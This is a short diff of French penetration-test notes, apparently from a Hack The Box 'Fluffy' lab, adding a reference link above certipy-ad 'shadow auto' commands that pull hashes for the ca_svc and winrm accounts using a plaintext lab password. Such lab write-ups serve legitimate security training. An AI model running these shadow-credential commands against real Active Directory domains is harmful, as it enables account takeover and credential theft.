@@ -5,6 +5,7 @@
 
 
 ### Récupérer les hashs de comptes avec certipyad
+ref : https://github.com/GhostPack/Certify
 ```bash
  certipy-ad shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account ca_svc
  certipy-ad shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account winrm
